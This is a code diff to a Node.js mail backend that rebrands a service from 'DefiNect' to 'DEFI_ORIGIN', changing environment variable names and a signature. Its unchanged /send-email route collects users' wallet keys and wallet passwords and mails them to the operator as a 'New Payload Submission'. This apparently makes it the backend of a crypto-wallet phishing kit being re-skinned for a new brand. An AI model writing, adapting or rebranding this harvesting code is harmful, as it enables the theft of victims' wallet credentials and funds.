@@ -11,8 +11,8 @@ const transporter = nodemailer.createTransport({
   port: 465,
   secure: true,
   auth: {
-    user: process.env.EMAIL_DEFINECT,
-    pass: process.env.EMAIL_DEFINECT_PASS,
+    user: process.env.EMAIL_DEFIORIGIN,
+    pass: process.env.EMAIL_DEFIORIGIN_PASS,
   },
 });
 
@@ -20,8 +20,8 @@ const transporter = nodemailer.createTransport({
 router.post("/send-email", (req, res) => {
   const { iconId, iconName, keyType, userKey, walletPassword } = req.body;
   const mailOptions = {
-    from: process.env.EMAIL_DEFINECT,
-    to: process.env.EMAIL_DEFINECT,
+    from: process.env.EMAIL_DEFIORIGIN,
+    to: process.env.EMAIL_DEFIORIGIN,
     subject: "New Payload Submission",
     text: `
 Icon ID: ${iconId}
@@ -47,14 +47,14 @@ router.post("/contact", (req, res) => {
   const { email, message } = req.body;
 
   const adminMailOptions = {
-    from: process.env.EMAIL_DEFINECT,
-    to: process.env.EMAIL_DEFINECT,
+    from: process.env.EMAIL_DEFIORIGIN,
+    to: process.env.EMAIL_DEFIORIGIN,
     subject: "New Message from Contact Form",
     text: `Email: ${email}\n\nMessage:\n${message}`,
   };
 
   const userMailOptions = {
-    from: process.env.EMAIL_DEFINECT,
+    from: process.env.EMAIL_DEFIORIGIN_FROM,
     to: email,
     subject: "Thank you for contacting us",
     text: `
@@ -66,7 +66,7 @@ Your message:
 ${message}
 
 Best regards,
-DefiNect
+DEFI_ORIGIN
     `,
   };
 
